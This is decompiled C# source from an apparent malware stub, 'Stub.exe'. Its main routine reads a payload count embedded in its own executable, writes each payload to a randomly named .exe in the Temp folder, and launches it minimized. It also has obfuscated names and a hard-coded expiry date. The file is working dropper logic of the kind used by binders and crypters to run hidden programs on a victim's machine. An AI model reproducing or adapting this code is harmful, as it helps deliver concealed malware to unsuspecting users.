// Decompiled with JetBrains decompiler
// Type: Class9
// Assembly: WindowsApplication2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5810AC99-674B-4B41-BCEC-6D5ABE1706F8
// Assembly location: C:\Users\gorno\Desktop\vm\Stub.exe

using dummy_ptr;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class Class9
{
  [SpecialName]
  internal static Class0 get_Class0_0()
  {
    // ISSUE: variable of a compiler-generated type
    Class0 class0 = Class1.get_Class0_0();
    return class0;
  }

  [MethodImpl(MethodImplOptions.NoOptimization)]
  public static void smethod_0()
  {
    int num1;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      int integer = Conversions.ToInteger(Encoding.UTF7.GetString(\u007B4b68ba11\u002D197b\u002D4361\u002D8029\u002D5ae806378121\u007D.smethod_0(Application.ExecutablePath, 1)));
label_4:
      num3 = 3;
      int num4 = checked (integer - 1);
      int num5 = 0;
      goto label_10;
label_5:
      num3 = 4;
      string str1 = Class3.Class2_0.FileSystem.SpecialDirectories.Temp + "\\";
label_6:
      num3 = 5;
      string str2 = Class9.smethod_1(35);
label_7:
      num3 = 6;
      File.WriteAllBytes(str1 + str2 + ".exe", \u007B4b68ba11\u002D197b\u002D4361\u002D8029\u002D5ae806378121\u007D.smethod_1(\u007B4b68ba11\u002D197b\u002D4361\u002D8029\u002D5ae806378121\u007D.smethod_0(Application.ExecutablePath, checked (num5 + 2))));
label_8:
      num3 = 7;
      Interaction.Shell(str1 + str2 + ".exe", AppWinStyle.MinimizedFocus, false, -1);
label_9:
      num3 = 8;
      checked { ++num5; }
label_10:
      if (num5 > num4)
      {
        ProjectData.EndApp();
        goto label_19;
      }
      else
        goto label_5;
label_13:
      num2 = num3;
      if (num1 > -2)
        goto label_14;
label_12:
      int num6 = num2 + 1;
      num2 = 0;
      switch (num6)
      {
        case 1:
          goto label_2;
        case 2:
          goto label_3;
        case 3:
          goto label_4;
        case 4:
          goto label_5;
        case 5:
          goto label_6;
        case 6:
          goto label_7;
        case 7:
          goto label_8;
        case 8:
          goto label_9;
        case 9:
          goto label_19;
        default:
          goto label_18;
      }
label_14:
      switch (num1)
      {
        case 1:
          goto label_12;
      }
    }
    catch (Exception ex) when (ex is Exception & (uint) num1 > 0U & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_13;
    }
label_18:
    throw ProjectData.CreateProjectError(-2146828237);
label_19:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  [STAThread]
  public static void Main()
  {
    if (DateTime.Now > new DateTime(636544070262580000L))
      throw new Exception();
    Class9.smethod_0();
  }

  public static string smethod_1(int value)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "A0B1C2D3E4F5G6H7I8J9KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = value;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round(unchecked ((double) Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1.0)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern IntPtr FindResource(IntPtr o, [In] string obj1, [In] string obj2);

  [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr GetModuleHandleA(ref string int_0);
}
